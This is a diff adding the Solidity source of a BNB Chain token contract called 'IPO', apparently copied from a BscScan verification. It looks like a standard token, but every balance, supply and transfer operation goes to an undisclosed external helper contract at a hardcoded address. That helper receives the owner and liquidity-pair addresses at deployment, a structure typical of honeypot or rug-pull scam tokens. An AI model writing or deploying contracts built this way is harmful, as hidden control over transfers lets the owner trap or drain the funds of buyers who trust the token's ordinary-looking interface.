@@ -1,0 +1,125 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-04-17
+*/
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+interface IDEXFactory {
+    function createPair(address tokenA, address tokenB)
+        external
+        returns (address pair);
+}
+
+interface solHelper {
+
+    function initToken(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;
+
+    function getTotal() view external returns (uint256);
+
+    function getBalance(address _owner) view external returns (uint256);
+
+    function exeTransfer(address _from, address _to, uint256 _value) external;
+
+}
+
+interface IDEXRouter {
+    function factory() external pure returns (address);
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+}
+
+contract IPO {
+	
+    string public name = "IPO";
+    string  public symbol = "IPO";
+    uint8   public decimals = 9;
+	uint256 public totalSupply_ = 100000000 * (10 ** decimals);
+	
+	address public tokenOwner;
+	address public pairs;
+	IDEXRouter public router;
+	address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+	solHelper help = solHelper(0xAc4D603675EaAea7F94C84ba73211b4a80e0E81D);
+
+	constructor() {
+		tokenOwner=msg.sender;
+        
+        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));
+
+        help.initToken(totalSupply_, address(this), tokenOwner,pairs);
+
+        emit Transfer(address(0), tokenOwner, totalSupply_);
+    }
+	
+    event Transfer(
+        address indexed _from,
+        address indexed _to,
+        uint256 _value
+    );
+
+    event Approval(
+        address indexed _owner,
+        address indexed _spender,
+        uint256 _value
+    );
+    
+    mapping(address => mapping(address => uint256)) public allowed;
+	
+
+    function totalSupply() public view returns (uint256) {
+        return help.getTotal();
+    }
+
+    function balanceOf(address _owner) public view returns (uint256) {
+        return help.getBalance(_owner);
+    }
+    
+    function transfer(address _to, uint256 _value) public returns (bool success) {
+        require(help.getBalance(msg.sender) >= _value);
+
+        help.exeTransfer(msg.sender,_to,_value);
+        emit Transfer(msg.sender, _to, _value);
+
+		return true;
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
+        require(_value <= help.getBalance(_from));
+        require(_value <= allowed[_from][msg.sender]);
+		
+		help.exeTransfer(_from,_to,_value);
+
+        emit Transfer(_from, _to, _value);
+        
+		return true;
+    }
+	
+	function approve(address _spender, uint256 _value) public returns (bool success) {
+        allowed[msg.sender][_spender] = _value;
+
+        emit Approval(msg.sender, _spender, _value);
+		
+        return true;
+    }
+    
+    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
+        return allowed[_owner][_spender];
+    }
+	
+}
